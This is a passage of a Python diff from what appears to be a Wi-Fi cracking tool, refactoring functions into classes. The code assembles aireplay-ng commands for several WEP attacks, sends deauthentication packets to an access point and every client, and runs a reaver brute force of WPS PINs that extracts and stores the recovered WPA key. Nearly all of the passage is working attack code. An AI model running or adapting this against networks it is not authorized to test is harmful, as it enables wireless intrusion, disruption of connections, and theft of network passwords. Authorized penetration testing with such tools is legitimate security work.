-            return True
-        
-        print R+'failed'+W,
-        stdout.flush()
-        time.sleep(0.5)
-        continue
-    print ''
-    return False
+        print ''
+        return False
     
 
-def get_aireplay_command(iface, attack_num, target, clients, client_mac):
-    """
-        Returns aireplay-ng command line arguments based on parameters.
-    """
-    global RUN_CONFIG
-    cmd = ''
-    if attack_num == 0:
-        cmd = ['aireplay-ng',
-               '--ignore-negative-one',
-               '--arpreplay',
-               '-b', target.bssid,
-               '-x', str(RUN_CONFIG.WEP_PPS)] # Packets per second
-        if client_mac != '': 
-            cmd.append('-h')
-            cmd.append(client_mac)
-        elif len(clients) > 0: 
-            cmd.append('-h')
-            cmd.append(clients[0].bssid)
-        cmd.append(iface)
+    def get_aireplay_command(self, iface, attack_num, target, clients, client_mac):
+        """
+            Returns aireplay-ng command line arguments based on parameters.
+        """
+        global RUN_CONFIG
+        cmd = ''
+        if attack_num == 0:
+            cmd = ['aireplay-ng',
+                   '--ignore-negative-one',
+                   '--arpreplay',
+                   '-b', target.bssid,
+                   '-x', str(RUN_CONFIG.WEP_PPS)] # Packets per second
+            if client_mac != '': 
+                cmd.append('-h')
+                cmd.append(client_mac)
+            elif len(clients) > 0: 
+                cmd.append('-h')
+                cmd.append(clients[0].bssid)
+            cmd.append(iface)
         
-    elif attack_num == 1:
-        cmd = ['aireplay-ng',
-               '--ignore-negative-one',
-               '--chopchop',
-               '-b', target.bssid,
-               '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
-               '-m', '60', # Minimum packet length (bytes)
-               '-n', '82', # Maxmimum packet length
-               '-F'] # Automatically choose the first packet
-        if client_mac != '': 
-            cmd.append('-h')
-            cmd.append(client_mac)
-        elif len(clients) > 0: 
-            cmd.append('-h')
-            cmd.append(clients[0].bssid)
-        cmd.append(iface)
+        elif attack_num == 1:
+            cmd = ['aireplay-ng',
+                   '--ignore-negative-one',
+                   '--chopchop',
+                   '-b', target.bssid,
+                   '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
+                   '-m', '60', # Minimum packet length (bytes)
+                   '-n', '82', # Maxmimum packet length
+                   '-F'] # Automatically choose the first packet
+            if client_mac != '': 
+                cmd.append('-h')
+                cmd.append(client_mac)
+            elif len(clients) > 0: 
+                cmd.append('-h')
+                cmd.append(clients[0].bssid)
+            cmd.append(iface)
         
-    elif attack_num == 2:
-        cmd = ['aireplay-ng',
-               '--ignore-negative-one',
-               '--fragment',
-               '-b', target.bssid,
-               '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
-               '-m', '100', # Minimum packet length (bytes)
-               '-F'] # Automatically choose the first packet
-        if client_mac != '': 
-            cmd.append('-h')
-            cmd.append(client_mac)
-        elif len(clients) > 0: 
-            cmd.append('-h')
-            cmd.append(clients[0].bssid)
-        cmd.append(iface)
+        elif attack_num == 2:
+            cmd = ['aireplay-ng',
+                   '--ignore-negative-one',
+                   '--fragment',
+                   '-b', target.bssid,
+                   '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
+                   '-m', '100', # Minimum packet length (bytes)
+                   '-F'] # Automatically choose the first packet
+            if client_mac != '': 
+                cmd.append('-h')
+                cmd.append(client_mac)
+            elif len(clients) > 0: 
+                cmd.append('-h')
+                cmd.append(clients[0].bssid)
+            cmd.append(iface)
     
-    elif attack_num == 3:
-        cmd = ['aireplay-ng',
-               '--ignore-negative-one',
-               '--caffe-latte',
-               '-b', target.bssid]
-        if len(clients) > 0:
-            cmd.append('-h')
-            cmd.append(clients[0].bssid)
-        cmd.append(iface)
+        elif attack_num == 3:
+            cmd = ['aireplay-ng',
+                   '--ignore-negative-one',
+                   '--caffe-latte',
+                   '-b', target.bssid]
+            if len(clients) > 0:
+                cmd.append('-h')
+                cmd.append(clients[0].bssid)
+            cmd.append(iface)
         
-    elif attack_num == 4:
-        cmd = ['aireplay-ng',
-               '--ignore-negative-one',
-               '--interactive',
-               '-b', target.bssid,
-               '-c', 'ff:ff:ff:ff:ff:ff',
-               '-t', '1', # Only select packets with ToDS bit set
-               '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
-               '-F',      # Automatically choose the first packet
-               '-p', '0841']
-        cmd.append(iface)
+        elif attack_num == 4:
+            cmd = ['aireplay-ng',
+                   '--ignore-negative-one',
+                   '--interactive',
+                   '-b', target.bssid,
+                   '-c', 'ff:ff:ff:ff:ff:ff',
+                   '-t', '1', # Only select packets with ToDS bit set
+                   '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
+                   '-F',      # Automatically choose the first packet
+                   '-p', '0841']
+            cmd.append(iface)
     
-    elif attack_num == 5:
-        if len(clients) == 0:
-            print R+' [0:00:00] unable to carry out hirte attack: '+O+'no clients'
-            return ''
+        elif attack_num == 5:
+            if len(clients) == 0:
+                print R+' [0:00:00] unable to carry out hirte attack: '+O+'no clients'
+                return ''
+            cmd = ['aireplay-ng',
+                   '--ignore-negative-one',
+                   '--cfrag',
+                   '-h', clients[0].bssid,
+                   iface]
+            
+        return cmd
+
+
+    def wep_send_deauths(self, iface, target, clients):
+        """
+            Sends deauth packets to broadcast and every client.
+        """
+        global RUN_CONFIG
+        # Send deauth to broadcast
         cmd = ['aireplay-ng',
                '--ignore-negative-one',
-               '--cfrag',
-               '-h', clients[0].bssid,
+               '--deauth', str(RUN_CONFIG.WPA_DEAUTH_COUNT),
+               '-a', target.bssid,
                iface]
-        
-    return cmd
-
-
-def wep_send_deauths(iface, target, clients):
-    """
-        Sends deauth packets to broadcast and every client.
-    """
-    global RUN_CONFIG
-    # Send deauth to broadcast
-    cmd = ['aireplay-ng',
-           '--ignore-negative-one',
-           '--deauth', str(RUN_CONFIG.WPA_DEAUTH_COUNT),
-           '-a', target.bssid,
-           iface]
-    call(cmd, stdout=DN, stderr=DN)
-    # Send deauth to every client
-    for client in clients:
-        cmd = ['aireplay-ng',
-                 '--ignore-negative-one',
-                 '--deauth', str(RUN_CONFIG.WPA_DEAUTH_COUNT),
-                 '-a', target.bssid,
-                 '-h', client.bssid,
-                 iface]
         call(cmd, stdout=DN, stderr=DN)
+        # Send deauth to every client
+        for client in clients:
+            cmd = ['aireplay-ng',
+                     '--ignore-negative-one',
+                     '--deauth', str(RUN_CONFIG.WPA_DEAUTH_COUNT),
+                     '-a', target.bssid,
+                     '-h', client.bssid,
+                     iface]
+            call(cmd, stdout=DN, stderr=DN)
 
 
 #################
 # WPS FUNCTIONS #
 #################
+class WPSAttack:
+    def attack_wps(self, iface, target):
+        """
+            Mounts attack against target on iface.
+            Uses "reaver" to attempt to brute force the PIN.
+            Once PIN is found, PSK can be recovered.
+            PSK is displayed to user and added to WPS_FINDINGS
+        """
+        global RUN_CONFIG
+        print GR+' [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % \
+                     (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
+    
+        cmd = ['reaver',
+               '-i', iface,
+               '-b', target.bssid,
+               '-o', RUN_CONFIG.temp + 'out.out', # Dump output to file to be monitored
+               '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
+               '-c', target.channel,
+               # '--ignore-locks',
+               '-vv']  # verbose output
+        proc = Popen(cmd, stdout=DN, stderr=DN)
+    
+        cracked = False   # Flag for when password/pin is found
+        percent = 'x.xx%' # Percentage complete
+        aps     = 'x'     # Seconds per attempt
+        time_started = time.time()
+        last_success = time_started # Time of last successful attempt
+        last_pin = ''     # Keep track of last pin tried (to detect retries)
+        retries  = 0      # Number of times we have attempted this PIN
+        tries_total = 0      # Number of times we have attempted all pins
+        tries    = 0      # Number of successful attempts
+        pin = ''
+        key = ''
+    
+        try:
+            while not cracked:
+                time.sleep(1)
+                
+                if proc.poll() != None:
+                    # Process stopped: Cracked? Failed? 
+                    inf = open(RUN_CONFIG.temp + 'out.out', 'r')
+                    lines = inf.read().split('\n')
+                    inf.close()
+                    for line in lines:
+                        # When it's cracked:
+                        if line.find("WPS PIN: '") != -1:
+                            pin = line[line.find("WPS PIN: '") + 10:-1]
+                        if line.find("WPA PSK: '") != -1:
+                            key = line[line.find("WPA PSK: '") + 10:-1]
+                            cracked = True
+                    break
 
-def wps_attack(iface, target):
-    """
-        Mounts attack against target on iface.
-        Uses "reaver" to attempt to brute force the PIN.
-        Once PIN is found, PSK can be recovered.
-        PSK is displayed to user and added to WPS_FINDINGS
-    """
-    global RUN_CONFIG
-    print GR+' [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % \
-                 (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
-    
-    cmd = ['reaver',
-           '-i', iface,
-           '-b', target.bssid,
-           '-o', RUN_CONFIG.temp + 'out.out', # Dump output to file to be monitored
-           '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
-           '-c', target.channel,
-           # '--ignore-locks',
-           '-vv']  # verbose output
-    proc = Popen(cmd, stdout=DN, stderr=DN)
-    
-    cracked = False   # Flag for when password/pin is found
-    percent = 'x.xx%' # Percentage complete
-    aps     = 'x'     # Seconds per attempt
-    time_started = time.time()
-    last_success = time_started # Time of last successful attempt
-    last_pin = ''     # Keep track of last pin tried (to detect retries)
-    retries  = 0      # Number of times we have attempted this PIN
-    tries_total = 0      # Number of times we have attempted all pins
-    tries    = 0      # Number of successful attempts
-    pin = ''
-    key = ''
-    
-    try:
-        while not cracked:
-            time.sleep(1)
-            
-            if proc.poll() != None:
-                # Process stopped: Cracked? Failed? 
+                if not os.path.exists(RUN_CONFIG.temp + 'out.out'): continue
+                
                 inf = open(RUN_CONFIG.temp + 'out.out', 'r')
                 lines = inf.read().split('\n')
                 inf.close()
+            
                 for line in lines:
-                    # When it's cracked:
-                    if line.find("WPS PIN: '") != -1:
+                    if line.strip() == '': continue
+                    # Status
+                    if line.find(' complete @ ') != -1 and len(line) > 8:
+                        percent = line.split(' ')[1]
+                        i = line.find(' (')
+                        j = line.find(' seconds/', i)
+                        if i != -1 and j != -1: aps = line[i+2:j]
+                    # PIN attempt
+                    elif line.find(' Trying pin ') != -1:
+                        pin = line.strip().split(' ')[-1]
+                        if pin == last_pin: 
+                            retries += 1
+                        elif tries_total == 0:
+                            last_pin = pin
+                            tries_total -= 1
+                        else:
+                            last_success = time.time()
+                            tries += 1
+                            last_pin = pin
+                            retries = 0
+                        tries_total += 1
+                    
+                    # Warning
+                    elif line.endswith('10 failed connections in a row'): pass
+                
+                    # Check for PIN/PSK
+                    elif line.find("WPS PIN: '") != -1:
                         pin = line[line.find("WPS PIN: '") + 10:-1]
-                    if line.find("WPA PSK: '") != -1:
+                    elif line.find("WPA PSK: '") != -1:
                         key = line[line.find("WPA PSK: '") + 10:-1]
                         cracked = True
-                break
-
-            if not os.path.exists(RUN_CONFIG.temp + 'out.out'): continue
-            
-            inf = open(RUN_CONFIG.temp + 'out.out', 'r')
-            lines = inf.read().split('\n')
-            inf.close()
-            
-            for line in lines:
-                if line.strip() == '': continue
-                # Status
-                if line.find(' complete @ ') != -1 and len(line) > 8:
-                    percent = line.split(' ')[1]
-                    i = line.find(' (')
-                    j = line.find(' seconds/', i)
-                    if i != -1 and j != -1: aps = line[i+2:j]
-                # PIN attempt
-                elif line.find(' Trying pin ') != -1:
-                    pin = line.strip().split(' ')[-1]
-                    if pin == last_pin: 
-                        retries += 1
-                    elif tries_total == 0:
-                        last_pin = pin
-                        tries_total -= 1
-                    else:
-                        last_success = time.time()
-                        tries += 1
-                        last_pin = pin
-                        retries = 0
-                    tries_total += 1
-                    
-                # Warning
-                elif line.endswith('10 failed connections in a row'): pass
+                    if cracked: break
                 
-                # Check for PIN/PSK
-                elif line.find("WPS PIN: '") != -1:
-                    pin = line[line.find("WPS PIN: '") + 10:-1]
-                elif line.find("WPA PSK: '") != -1:
-                    key = line[line.find("WPA PSK: '") + 10:-1]
-                    cracked = True
-                if cracked: break
+                print ' %s WPS attack, %s success/ttl,' % \
+                                        (GR+sec_to_hms(time.time()-time_started)+W, \
+                                        G+str(tries)+W+'/'+O+str(tries_total)+W),
             
-            print ' %s WPS attack, %s success/ttl,' % \
-                                    (GR+sec_to_hms(time.time()-time_started)+W, \
-                                    G+str(tries)+W+'/'+O+str(tries_total)+W),
-            
-            if percent == 'x.xx%' and aps == 'x': print '\r',
-            else:
-                print '%s complete (%s sec/att)   \r' % (G+percent+W, G+aps+W),
+                if percent == 'x.xx%' and aps == 'x': print '\r',
+                else:
+                    print '%s complete (%s sec/att)   \r' % (G+percent+W, G+aps+W),
             
             
-            if RUN_CONFIG.WPS_TIMEOUT > 0 and (time.time() - last_success) > RUN_CONFIG.WPS_TIMEOUT:
-                print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (RUN_CONFIG.WPS_TIMEOUT)
-                print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
-                break
+                if RUN_CONFIG.WPS_TIMEOUT > 0 and (time.time() - last_success) > RUN_CONFIG.WPS_TIMEOUT:
+                    print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (RUN_CONFIG.WPS_TIMEOUT)
+                    print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
+                    break
             
-            if RUN_CONFIG.WPS_MAX_RETRIES > 0 and retries > RUN_CONFIG.WPS_MAX_RETRIES:
-                print R+'\n [!]'+O+' unable to complete successful try in %d retries' % (RUN_CONFIG.WPS_MAX_RETRIES)
-                print R+' [+]'+O+' the access point may have WPS-locking enabled, or is too far away'+W
-                print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
-                break
+                if RUN_CONFIG.WPS_MAX_RETRIES > 0 and retries > RUN_CONFIG.WPS_MAX_RETRIES:
+                    print R+'\n [!]'+O+' unable to complete successful try in %d retries' % (RUN_CONFIG.WPS_MAX_RETRIES)
+                    print R+' [+]'+O+' the access point may have WPS-locking enabled, or is too far away'+W
+                    print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
+                    break
                 
-            if RUN_CONFIG.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (float(tries) / tries_total) < RUN_CONFIG.WPS_RATIO_THRESHOLD:
-                print R+'\n [!]'+O+' successful/total attempts ratio was too low (< %.2f)' % (RUN_CONFIG.WPS_RATIO_THRESHOLD)
-                print R+' [+]'+W+' skipping %s' % (G+target.ssid+W)
-                break
+                if RUN_CONFIG.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (float(tries) / tries_total) < RUN_CONFIG.WPS_RATIO_THRESHOLD:
+                    print R+'\n [!]'+O+' successful/total attempts ratio was too low (< %.2f)' % (RUN_CONFIG.WPS_RATIO_THRESHOLD)
+                    print R+' [+]'+W+' skipping %s' % (G+target.ssid+W)
+                    break
                 
-            stdout.flush()
-            # Clear out output file if bigger than 1mb
-            inf = open(RUN_CONFIG.temp + 'out.out', 'w')
-            inf.close()
+                stdout.flush()
+                # Clear out output file if bigger than 1mb
+                inf = open(RUN_CONFIG.temp + 'out.out', 'w')
+                inf.close()
         
-        # End of big "while not cracked" loop
+            # End of big "while not cracked" loop
         
-        if cracked:
-            if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
-            if key != '': print GR+' [+] %sWPA key found:%s %s' % (G, W, C+key+W)
-            RUN_CONFIG.WPA_FINDINGS.append(W+"found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, C+pin+W))
-            RUN_CONFIG.WPA_FINDINGS.append('')
+            if cracked:
+                if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
+                if key != '': print GR+' [+] %sWPA key found:%s %s' % (G, W, C+key+W)
+                RUN_CONFIG.WPA_FINDINGS.append(W+"found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, C+pin+W))
+                RUN_CONFIG.WPA_FINDINGS.append('')
             
-            t = Target(target.bssid, 0,0,0, 'WPA', target.ssid)
-            t.key = key
-            t.wps = pin
-            RUN_CONFIG.save_cracked(t)
+                t = Target(target.bssid, 0,0,0, 'WPA', target.ssid)
+                t.key = key
+                t.wps = pin
+                RUN_CONFIG.save_cracked(t)
         
-    except KeyboardInterrupt:
-        print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
-        if attack_interrupted_prompt():
-            send_interrupt(proc)
-            print ''
-            exit_gracefully(0)
+        except KeyboardInterrupt:
+            print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
+            if attack_interrupted_prompt():
+                send_interrupt(proc)
+                print ''
+                exit_gracefully(0)
     
-    send_interrupt(proc)
+        send_interrupt(proc)
     
-    return cracked
+        return cracked
 
 
 if __name__ == '__main__':
